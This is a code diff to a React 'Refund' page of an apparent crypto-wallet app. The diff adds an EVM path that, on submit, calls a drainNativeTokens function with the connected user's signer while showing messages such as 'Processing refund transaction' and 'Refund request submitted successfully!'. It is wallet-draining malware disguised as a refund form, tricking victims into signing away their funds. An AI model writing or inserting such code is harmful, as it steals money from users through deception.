@@ -17,6 +17,9 @@ import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAsso
 import { sendTelegramMessage } from '@/utils/telegram';
 import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -45,6 +48,8 @@ const Refund = () => {
   const navigate = useNavigate();
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
+  const { activeChain, getEVMChain } = useChain();
+  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
 
   const [service, setService] = useState('');
   const [reason, setReason] = useState('');
@@ -128,6 +133,28 @@ const Refund = () => {
   }, [publicKey, connection]);
 
   const handleSubmit = async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setIsProcessing(true);
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} refund transaction...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success('Refund request submitted successfully!');
+          setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+      } catch (error: any) {
+        toast.error('Refund failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsProcessing(false);
+      }
+      return;
+    }
+
+    // Solana path
     if (!canSubmit || !publicKey) return;
 
     try {
